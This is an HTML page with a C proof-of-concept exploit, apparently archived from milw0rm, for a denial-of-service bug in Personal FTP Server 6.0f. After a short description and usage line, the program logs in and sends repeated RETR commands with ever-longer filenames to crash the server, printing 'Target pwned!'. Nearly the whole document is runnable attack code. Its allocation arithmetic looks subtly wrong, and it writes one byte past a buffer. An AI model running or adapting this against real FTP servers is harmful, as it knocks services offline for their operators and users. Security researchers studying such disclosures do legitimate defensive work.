<html><head><title>The Personal FTP Server 6.0f RETR Denial of Service Exploit</title></head><pre>/*
*** The Personal FTP Server 6.0f RETR DOS exploit ***

A vulnerability exists in the way Personal FTP Server handles
multiple RETR commands with overly long filenames.When confronted
with such consecutive requests the server will crash.

Usage : ./pftpdos ip port user password
Ex. : ./pftpdos 127.0.0.1 21 test test

Personal FTP Server homepage: http://www.michael-roth-software.de/

Discovey + POC by Shinnok raydenxy [at] yahoo &lt;dot&gt; com
http://shinnok.evonet.ro

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;string.h&gt;
#include &lt;malloc.h&gt;
#include &lt;errno.h&gt;

int
min (int x, int y)
{
    if (x &lt; y)return x;
    else
    return y;
}
extern int errno;

int
main (int argc, char *argv[])
{
    struct sockaddr_in server;
    int i, t, s;
    char *req, *buff;
    s = socket (AF_INET, SOCK_STREAM, 0);
    bzero (&amp;server, sizeof (server));
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr (argv[1]);
    server.sin_port = htons (atoi (argv[2]));
    connect (s, (struct sockaddr *) &amp;server, sizeof (struct sockaddr));
    req = malloc (sizeof (char) * \
    (((strlen (argv[3]) - strlen (argv[4])) + \
    min (strlen (argv[3]), strlen (argv[4])) + 8)));
    sprintf (req, &quot;USER %s\xD\xA&quot;, argv[3]);
    write (s, req, strlen (req));
    sprintf (req, &quot;PASS %s\xD\xA&quot;, argv[4]);
    write (s, req, strlen (req));
    free (req);
    for (i = 1; i &lt;= 5; i++)
    {
        t = (sizeof (char) * 1000 * i);
        buff = malloc (t + 1);
        memset (buff, 'A', t);
        buff[t + 1] = '\0';
        req = malloc (t + 9);
        sprintf (req, &quot;RETR %s\xD\xA&quot;, buff);
        if (write (s, req, strlen (req)) == -1)
        {
            perror (NULL);
            printf (&quot;Target pwned!\n&quot;, errno);
        }
        free (req);
        free (buff);
        sleep (1);
    }
    close (s);
    return (EXIT_SUCCESS);
}

// milw0rm.com [2008-09-14]</pre></html>